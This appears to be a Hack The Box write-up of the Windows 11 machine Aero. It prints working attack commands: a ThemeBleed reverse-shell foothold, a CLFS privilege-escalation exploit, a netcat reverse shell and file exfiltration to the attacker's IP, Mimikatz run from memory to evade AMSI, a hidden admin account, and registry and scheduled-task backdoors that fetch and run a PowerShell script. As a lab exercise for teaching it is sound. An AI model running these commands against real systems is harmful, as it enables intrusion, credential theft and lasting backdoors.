+++
title = "Aero HTB Walkthrough: ThemeBleed and CLFS Exploitation"
draft = false
tags = ["Windows", "HTB", "Hack The Box", "CVE-2023-38146", "ThemeBleed", "CVE-2023-28252", "CLFS", "Windows 11", "Privilege Escalation", "IIS", "Persistence", "Registry Backdoor", "Scheduled Tasks"]
keywords = ["Hack The Box Aero", "ThemeBleed exploitation", "CVE-2023-38146 walkthrough", "CLFS vulnerability", "Windows 11 theme exploitation", "CVE-2023-28252 tutorial", "Windows persistence techniques", "Registry backdoor methods", "Scheduled task persistence", "IIS security assessment"]
description = "A detailed walkthrough of the Aero machine from Hack The Box, demonstrating exploitation of the ThemeBleed vulnerability (CVE-2023-38146) and CLFS (CVE-2023-28252). Learn about Windows 11 security mechanisms, advanced persistence techniques using registry modifications and scheduled tasks."
author = "bloodstiller"
date = 2024-11-05
toc = true
bold = true
next = true
lastmod = 2024-11-05
+++

## Aero Hack The Box Walkthrough/Writeup: {#aero-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Aero>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:23:39 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:23 GMT
        Nmap scan report for 10.129.229.128
        Host is up (0.036s latency).
        Not shown: 999 filtered tcp ports (no-response)
        PORT   STATE SERVICE
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds

        ```
    -   **Initial thoughts**:
        -   Well looks like we are checking out the webserver&#x2026;.

-   **Basic UDP Scan**:
    -   `sudo nmap $box -sU -Pn -oA UDPbasicScan`

<!--listend-->

```shell
kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh
🕙 08:23:55 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan
[sudo] password for kali:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:24 GMT
Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 56.00% done; ETC: 08:27 (0:01:29 remaining)
Nmap scan report for 10.129.229.128
Host is up.
All 1000 scanned ports on 10.129.229.128 are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 201.42 seconds

```

-   **Initial thoughts**:
    -   Nothing additional being run on the UDP side.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  3GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 3m25s
    🕙 08:27:36 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:30 GMT
    Nmap scan report for 10.129.229.128
    Host is up (0.040s latency).
    Not shown: 65534 filtered tcp ports (no-response)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Aero Theme Hub
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 11 (88%)
    Aggressive OS guesses: Microsoft Windows 11 21H2 (88%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 175.09 seconds

    ```

    -   **Findings**:
        -   Nothing further which means we will be leveraging a web based attack.


### Web `80`: {#web-80}


#### Dirbusting the webserver using ffuf: {#dirbusting-the-webserver-using-ffuf}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-11-04-082908_.png" >}}
    -   We can see there is an upload dir which is interesting, as this means we can most likely upload something.


#### Running whatweb {#running-whatweb}

-   I run whatweb for further enumeration however it doesn't tell us anything additional. We knew it was `IIS` from our nmap scan.

<!--listend-->

```shell
kali in HTB/BlogEntriesMade/Aero/scans/nmap  🍣 main  4GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 2m55s
🕙 08:33:15 zsh ❯ whatweb $box
http://10.129.229.128 [200 OK] Bootstrap, Cookies[.AspNetCore.Antiforgery.SV5HtsIgkxc], Country[RESERVED][ZZ], Email[support@aerohub.htb], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.AspNetCore.Antiforgery.SV5HtsIgkxc], IP[10.129.229.128], Microsoft-IIS[10.0], Script, Title[Aero Theme Hub], X-Frame-Options[SAMEORIGIN], X-Powered-By[ARR/3.0]

```


#### Web-site Enumeration: {#web-site-enumeration}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
        -   Record all potential injection points.
        -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


##### Discovering the upload portal: {#discovering-the-upload-portal}

-   **Looking at the page it appears to be a single page site dedicated to windows 11 themes**:
    -   {{< figure src="/ox-hugo/2024-11-05-160758_.png" >}}

-   **We find the upload portal straight away**:
    -   {{< figure src="/ox-hugo/2024-11-04-083244_.png" >}}
    -   As we can see it's looking for us to upload a windows theme.

-   **We can see it's looking for** "Custom Files":
    -   {{< figure src="/ox-hugo/2024-11-04-083207_.png" >}}
    -   I have a jpg in this folder currently as I wanted to see if it would allow any other sort of file extensions to be uploaded.

-   **I do some investigating and find** [this page](https://learn.microsoft.com/en-us/windows/win32/controls/themesfileformat-overview) **about** `.theme` **files**:
    -   I add the extension `.theme` to a `jpg` and it's now visible when searching for a file to upload &amp; it appears as expected.
    -   {{< figure src="/ox-hugo/2024-11-04-085220_.png" >}}


#### Discovering ThemeBleed CVE-2023-38146 exploit: {#discovering-themebleed-cve-2023-38146-exploit}

-   **After some searching online I find that there is a known exploit for windows 11 themes called** `ThemeBleed`:
    -   {{< figure src="/ox-hugo/2024-11-04-095336_.png" >}}


## 2. Foothold: {#2-dot-foothold}

-   **I find a POC here for the** `ThemeBleed` **exploit**: <https://github.com/Jnnshschl/CVE-2023-38146>
    -   The creator has also written a [blog-post](https://jnns.de/posts/cve-2023-38146-poc/) to accompany the POC.

<!--listend-->

-   +Deep Dive+: I have written a deep dive on this particular exploit you can find it here:
    -   <https://bloodstiller.com/articles/understandingthemebleedcve-2023-38146/>


### Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: {#building-the-themebleed-cve-2023-38146-reverse-shell-dll}

-   Reading the blog post we can see we need to create a reverse shell `dll` which will then be used as part of the exploit. Luckily the author has created a POC for this also:
    -   <https://github.com/Jnnshschl/ThemeBleedReverseShellDLL>

-   **Let's spin up a windows VM to build this**:
    -   I prefer to use a Windows 10 VM customized with the [Mandiant Commando script](https://github.com/mandiant/commando-vm)
    -   You will also require Visual Studio to compile this (+not Visual Studio Code+ ), so if you don't have this you will need [to install it](https://visualstudio.microsoft.com/downloads/).

-   **Setup the project**:
    -   Open visual studio
    -   Clone the repo
        -   {{< figure src="/ox-hugo/2024-11-04-174350_.png" >}}
        -   {{< figure src="/ox-hugo/2024-11-04-174430_.png" >}}

-   **Put our attack IP in the relevant pat**:
    -   On the right hand side find the `main.cpp` file ans scroll down to lines 32/34
        -   We enter our Attack Machines IP &amp; Port number we want to listen on.
        -   Ensure "autoReconnect" is set to `false`
    -   {{< figure src="/ox-hugo/2024-11-04-180155_.png" >}}

-   **Set to release per instructions**:
    -   {{< figure src="/ox-hugo/2024-11-04-180354_.png" >}}

-   **Build the solution**:
    -   {{< figure src="/ox-hugo/2024-11-04-180428_.png" >}}
    -   +Note+: Building the solution is just a way to saying "Compile the exploit"

-   **The file should be located in**:
    -   `C:\Users\[YourUserName]\source\repos\ThemeBleedReverseShellDLL\x64\Release\ThemeBleeedReverseShell.dll`


### Running the ThemeBleed Exploit to get a reverse shell: {#running-the-themebleed-exploit-to-get-a-reverse-shell}

-   **Switching back to the main repo, we clone that**:
    -   `git clone https://github.com/Jnnshschl/CVE-2023-38146.git`

-   **Moving the compiled reverse shell to the relevant folder**:
    -   Reading the instructions we need to move the compiled `ThemeBleeedReverseShell.dll` file to the `tb` folder in the main repo &amp; rename it to `Aero.msstyles_vrf_evil.dll`
        -   {{< figure src="/ox-hugo/2024-11-04-181130_.png" >}}
        -   +Note+: On the repo it says to move it to `td` but it's actually called `tb`

-   **Next I start my nc listner**:
    -   `rlwrap -cAr nc -nvlp 4711`

-   **Trigger the exploit**:
    -   `python3 themebleed.py -r [MYAttackMachine] --no-dll`

-   **It connects and we get our revers shell**:
    -   {{< figure src="/ox-hugo/2024-11-04-181233_.png" >}}
    -   As we can see it also appears to dump the hash for `sam.emerson` and connects as them I tried to crack this with `rockyou.txt` but no hits.


### Enumerating as sam.emerson: {#enumerating-as-sam-dot-emerson}

-   **Get the user flag**:
    -   {{< figure src="/ox-hugo/2024-11-04-181935_.png" >}}

-   **Looking in documents we find a CVE-2023-28252 pdf and a file called** `watchdog.ps1`
    -   {{< figure src="/ox-hugo/2024-11-04-182331_.png" >}}
        -   What looks interesting is the `CVE-2023-28252_Summary.pdf` lets grab that.
        -   +Note+: I checked out the `watchdog.ps1` script but it's just how the box works by checking for uploaded themes periodically (every 15 seconds)


### Exfiltrating the CVE-2023-28252_Summary.pdf using base64 encoding: {#exfiltrating-the-cve-2023-28252-summary-dot-pdf-using-base64-encoding}

-   As we only have 1 connection and no evil-winrm etc we have to live off the land. Luckily we can easily exfiltrate this using PowerShell &amp; base64 encoding.
    -   +Note+: I actually have a custom webserver called [bloodserver](https://bloodstiller.com/tools/bloodserver/) which would be perfect for this but I wanted to challenge myself to live off the land as much as possible with this box so stuck to using inbuilt windows functionality where possible.

-   **Lets base64 encode the pdf and assign to the variable** `$b64`:
    -   `$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Users\sam.emerson\Documents\CVE-2023-28252_Summary.pdf' -Encoding Byte))`
        -   {{< figure src="/ox-hugo/2024-11-05-163435_.png" >}}

-   **Setup our listner**:
    -   `nc -nvlp 9999`

-   **Send the base64 encoded pdf to our attack host**:
    -   `Invoke-WebRequest -Uri http://10.10.14.121:9999/ -Method POST -Body $b64`
    -   {{< figure src="/ox-hugo/2024-11-05-163413_.png" >}}

-   **Received on listner**:
    -   {{< figure src="/ox-hugo/2024-11-05-163343_.png" >}}

-   **Decode the base64 encoded string**:
    -   `echo "[bas64encodedpdf]" | base64 -d -w 0 >  CVE-2023-28252_Summary.pdf`
    -   {{< figure src="/ox-hugo/2024-11-05-163313_.png" >}}

-   **Reading the PDF goes more in depth about CVE-2023-28252**:
    -   {{< figure src="/ox-hugo/2024-11-05-175535_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Researching CVE-2023-28252 (CLFS) Vulnerability: {#researching-cve-2023-28252--clfs--vulnerability}

So as it looks like this host is vulnerable to this specific exploit (well its implied) lets find a POC.

-   **After some looking online I find various exploits however this one is actually pre-compiled and can save us some time.**
    -   <https://github.com/duck-sec/CVE-2023-28252-Compiled-exe>
    -   +Note+: Looking at the notes it also allows us to pass another binary as an argument to be executed. This is ideal as if we can run a process/binary with elevated privileges we can get a reverse shell as `NT/Authority`

-   +Deep Dive+: I have written a deep dive on this particular exploit you can find it here:
    -   <https://bloodstiller.com/articles/understanding2023-28252-clfs/>


-   **I clone exploit**:
    -   `git clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git`

-   **Transfer the exploit to the target**:
    -   `wget http://10.10.14.121:9000/exploit.exe -o ex.exe`
    -   {{< figure src="/ox-hugo/2024-11-04-194403_.png" >}}

-   **As this exploit allows us to execute a binary as an argument lets transfer** `n64.exe` **to the target too**:
    -   `wget http://10.10.14.121:9000/nc64.exe -o nc64.exe`
    -   {{< figure src="/ox-hugo/2024-11-04-194156_.png" >}}

-   **Lets start our listener for our reverse-shell**:
    -   `rlwrap -cAr nc -nvlp 443`
    -   {{< figure src="/ox-hugo/2024-11-04-194636_.png" >}}

-   **I trigger exploit and pass n64.exe as an argument**:
    -   `.\ex.exe 1208 1 "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 443"`
    -   {{< figure src="/ox-hugo/2024-11-04-194705_.png" >}}
    -   **High level Command Breakdown**:
        -   `.\ex.exe`: The compiled exploit executable
        -   `1208`: Process ID to target
        -   `1`: Execution mode flag
        -   Netcat parameters:
            -   `10.10.14.121`: Our attack IP address
            -   `443`: Port to connect back to
            -   `-e cmd`: Execute cmd.exe and bind it to the connection

-   **Catch** `NT/Authority` **system shell**:
    -   {{< figure src="/ox-hugo/2024-11-04-194750_.png" >}}

-   **Grab root flag**:
    -   {{< figure src="/ox-hugo/2024-11-04-194858_.png" >}}


## 4. Persistence: {#4-dot-persistence}


### Trying to dump creds with mimikatz: {#trying-to-dump-creds-with-mimikatz}

-   **I try and Transfer** `mimikatz` **but it gets caught by** `amsi`
    -   {{< figure src="/ox-hugo/2024-11-04-200330_.png" >}}
    -   I try multiple different ways however it's caught each time, luckily there are versions of mimikatz we can from memory:


### Using invoke-mimikatz.ps1 with a download cradle to dump hashes: {#using-invoke-mimikatz-dot-ps1-with-a-download-cradle-to-dump-hashes}

-   **Use a download cradle to grab the script**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1')`
-   **Perform LSADUMP**:
    -   `Invoke-Mimikatz -Command '"privilege::debug" "lsadump::sam"'`
    -   +Note+: With this information we can make a `kerberos` silver ticket; however we have no way to actually authenticate with the host once it's made as nothing is open&#x2026;so we will need to look at other solutions.
        -   {{< figure src="/ox-hugo/2024-11-05-130731_.png" >}}


#### Download Cradle Primer: {#download-cradle-primer}

-   We are going to be using a download cradle later, so it's probably best you understand how they work.


##### What is a Download Cradle? {#what-is-a-download-cradle}

In essence, a download cradle is a lightweight script or command that reaches out to the internet/host, downloads a file, and often executes it directly in memory. And that is why they work so well, as nothing is written to disk and instead runs in memory they are harder to detect:

-   **If we look at the** `invoke-mimikatz.ps1` **script we called**:
    -   `iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1')`
    -   This reaches out to a remote URL (our attack hosts), download's the payload, and execute &amp; loads it into memory all in one go. (later on you will see me use this again but instead to create a reverse shell that is called upon loading into memory)


##### How Do Attackers Use Download Cradles: {#how-do-attackers-use-download-cradles}

There are multiple ways to leverage download cradles in various stages of an attack. The most common is often during initial access or lateral movement phases. Here are some common scenarios:

-   **Delivering Malware**: By downloading and running malware directly in memory, it is possible to bypass traditional file-based antivirus.
    -   This is often done by ransomware gangs.
-   **Moving Through a Network**: In the above case we can use cradles to download tools for privilege escalation or credential theft as we navigate a compromised network/machine.
-   **Running Exploits**: Tools like Metasploit use download cradles to quickly deliver payloads that exploit vulnerabilities and gain control over systems.


##### Why Download Cradles are Effective: {#why-download-cradles-are-effective}

-   They are a great attack approach as they are:
    -   **Stealthy**: As they work without writing to disk, they leave less evidence for traditional detection tools.
    -   **Compact**: Cradles can be as short as a single line of code (as you can see with invoke-mimikatz), making them hard to spot amid legitimate scripts.
    -   **Flexible**: They can be adjusted and modified allowing what is being downloaded to be executed in real-time, adapting to the environment.


##### Detecting and Stopping Download Cradles: {#detecting-and-stopping-download-cradles}

While they’re sneaky, download cradles can be detected with the right strategies:

-   **Network Monitoring**: Watching for suspicious connections or repeated download attempts from unusual sources can reveal download cradle activity.
-   **Script Restrictions**: Limit the use of `PowerShell`, `Curl`, or `Wget` in environments where they aren’t essential. `PowerShell`, for instance, can be configured to block the `Invoke-WebRequest` command or require execution approval.
-   **EDR Solutions**: Endpoint Detection and Response (EDR) tools can help track process execution and identify cradle behaviors based on known patterns and heuristics.


### Creating a new user who is part of the administrators group: {#creating-a-new-user-who-is-part-of-the-administrators-group}

-   As we are an administrator we can also add a new user and add them to the administrators group.

-   **I add a new user as part of the administrators group**:
    -   `net user bloodstiller bl00dst1ll3r! /add`
    -   `net localgroup Administrators bloodstiller /add`
    -   {{< figure src="/ox-hugo/2024-11-04-201031_.png" >}}
    -   +Note+: I am doing this purely as a mechanism to showcase different ways to establish persistence, however as you have probably noticed there is no way to actually login as this user, the same way as there would be no way to use the Administrators Silver ticket if we made it, so what do we do, glad you asked.


### Living off the land persistence: {#living-off-the-land-persistence}

-   As this system only has the webserver running there are no other services we can authenticate against as a means of persistence. Creating silver tickets and adding admin users is great but if we cannot actually utilize those accounts &amp; tickets what can we do? We need to have the host call out to us, by creating a backdoor, or multiple back-doors.


#### Creating a registry key for a back-door: {#creating-a-registry-key-for-a-back-door}

-   The first backdoor I will create is to create an entry in the registry that runs on login, so that when a user logs in it will call out to my attack machine which has a listener running.
-   **Registry Key added**:
    -   `Reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NewBackDoor /t REG_SZ /d "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd"`
    -   {{< figure src="/ox-hugo/2024-11-05-100419_.png" >}}
    -   This will trigger when a user logs in, however as we have no way to test this or login as a normal user, we will need to also have another way in.


##### Registry Backdoor Command Breakdown: {#registry-backdoor-command-breakdown}

-   **Command Breakdown:**
    -   `Reg add`
        -   Adds or modifies a registry key or value.

    -   `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`
        -   Specifies the registry path.
        -   The `Run` key allows programs to run automatically when the user logs in.

    -   `/v NewBackDoor`
        -   Specifies the name of the registry value being added, here `NewBackDoor`.
        -   Acts as the identifier for this specific entry.

    -   `/t REG_SZ`
        -   Defines the type of the registry value.
        -   `REG_SZ` is a string value type commonly used for paths or commands.

    -   `/d "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd"`
        -   Sets the data for the registry value.
        -   **Path**: `"C:\Users\sam.emerson\Documents\nc64.exe"`
            -   Path to `nc64.exe` (likely `Netcat`), used to open a reverse shell.
        -   **IP Address\***: `10.10.14.121`
            -   Our attack machine that is listening where the reverse shell will connect.
        -   **Port**: `4433`
            -   The port number on our attack machine listening for the connection.
        -   **Flag**: `-e cmd`
            -   The `-e` flag executes `cmd.exe` upon connection, providing a command shell.

-   **Potential Defenses/Mitigation's**:
    -   **Monitoring**: Detect unusual registry changes in `HKEY_CURRENT_USER\...\Run`.
    -   **Network Monitoring**: Watch for unusual outgoing connections to external IPs and ports.


#### Creating a scheduled task back-door: {#creating-a-scheduled-task-back-door}

-   A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I've put two approaches below.


##### Version 1: Using nc64.exe to connect back to our attack host periodically: {#version-1-using-nc64-dot-exe-to-connect-back-to-our-attack-host-periodically}

-   **Scheduled Task Backdoor**:
    -   `schtasks /create /tn BackDoor /tr "C:\Users\sam.emerson\Documents\nc64.exe  10.10.14.121 4433 -e cmd" /sc minute /mo 1 /ru System`
    -   {{< figure src="/ox-hugo/2024-11-05-100459_.png" >}}
        -   +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host:
    -   **Shell Caught**:
        -   {{< figure src="/ox-hugo/2024-11-05-100314_.png" >}}
        -   Just to double check I disconnect to ensure it calls back out to me:
            -   {{< figure src="/ox-hugo/2024-11-05-100604_.png" >}}

<!--list-separator-->

-  Scheduled Task Backdoor Command Breakdown Running a Binary:

    -   **Command Breakdown**:
        -   `schtasks /create`
            -   Creates a new scheduled task on Windows.
        -   `/tn BackDoor`
            -   Sets the task name to `BackDoor`.
            -   This name is how the task will appear in the Task Scheduler.
        -   `/tr "C:\Users\sam.emerson\Documents\nc64.exe 10.10.14.121 4433 -e cmd"`
            -   Specifies the action that the task will execute.
            -   **Path**: `"C:\Users\sam.emerson\Documents\nc64.exe"`
                -   Path to `nc64.exe`, used to open a reverse shell.
            -   **IP Address\***: `10.10.14.121`
                -   Our attack machine that is listening where the reverse shell will connect.
            -   **Port**: `4433`
                -   The port number on our attack machine listening for the connection.
            -   **Flag**: `-e cmd`
                -   The `-e` flag executes `cmd.exe` upon connection, providing a command shell.
        -   `/sc minute`
            -   Sets the task's schedule frequency to every minute.
        -   `/mo 1`
            -   Modifier that, when used with `/sc minute`, runs the task every 1 minute.
        -   `/ru System`
            -   Specifies that the task should run with `System` privileges.
            -   Running as `System` grants high privileges, making this backdoor more dangerous.

    -   **Potential Defenses/Mitigation's**:
        -   **Monitor Scheduled Tasks**: Regularly check for unauthorized or unusual tasks, especially those scheduled to run frequently or with `System` privileges.
        -   **Network Monitoring**: Identify repeated outgoing connections to unknown IPs and ports, especially if made by `nc64.exe` or similar executables.


##### Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host: {#version-2-using-a-base64-encoded-powershell-reverse-shell-and-download-cradle-to-connect-back-to-our-attack-host}

-   So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)

-   **Create our reverse-shell script**:
    -   I use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using <https://revshells.com> for this
        -   {{< figure src="/ox-hugo/2024-11-05-134155_.png" >}}

-   **We then need to create our scheduled task**:
    -   `schtasks /create /tn ScriptCradle /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.121:8080/script.ps1'''))'" /sc minute /mo 1 /ru System`
    -   {{< figure src="/ox-hugo/2024-11-05-133749_.png" >}}

-   **Start our listener &amp; webserver**:
    -   Webserver:
        -   `python3 -m http.server [port]`
    -   Listener:
        -   `rlwrap -cAr nc -nvlp 53`

-   **The task grabs our script &amp; immediatley executes it in memory**:
    -   {{< figure src="/ox-hugo/2024-11-05-134010_.png" >}}

-   **We get our revere shell**:
    -   {{< figure src="/ox-hugo/2024-11-05-134027_.png" >}}

-   **Double check by disconnecting &amp; seeing if it re-connects and it does**:
    -   {{< figure src="/ox-hugo/2024-11-05-134907_.png" >}}

<!--list-separator-->

-  Scheduled Task Backdoor Utilizing Download Cradle Command Breakdown:

    -   `schtasks /create`
        -   Creates a new scheduled task on Windows.
    -   `/tn ScriptCradle`
        -   Sets the task name to `ScriptCradle`.
        -   This name is how the task will appear in the Task Scheduler.
    -   `/tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`
        -   Specifies the action that the task will execute.
        -   `powershell.exe`: Starts PowerShell.
        -   **Arguments passed to powershell**:
            -   `-WindowStyle hidden`: Runs the task in a hidden window to prevent showing the PowerShell window.
            -   `NoLogo -NonInteractive -ep bypass -nop`: PowerShell flags to suppress output and allow script execution bypassing restrictions.
            -   `IEX ((New-Object Net.WebClient).DownloadString(...))`: Uses `Invoke-Expression` to download and immediately execute the script.
            -   `/sc minute /mo 1`: Sets the task to run every 1 minute.
            -   `/ru System`: Runs the task under `System` privileges.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  This box was great as means to learn about the CVE's in question. However what I enjoyed more was figuring out ways to achieve persistence with such little open on the host. With only port 80 being open creating a consistent means of re-entering the host was interesting to me and a good exercise
2.  Learning about the CVE's CVE-2023-38146 &amp; CVE-2023-28252 was very interesting.
    -   There is a great article here about CLFS vulnerability but it's ALOT:
        -   <https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability>
3.  I wrote two deep dives to understand these attacks more.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Not a huge amount this time to be honest, which is fun. Might actually be improving.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


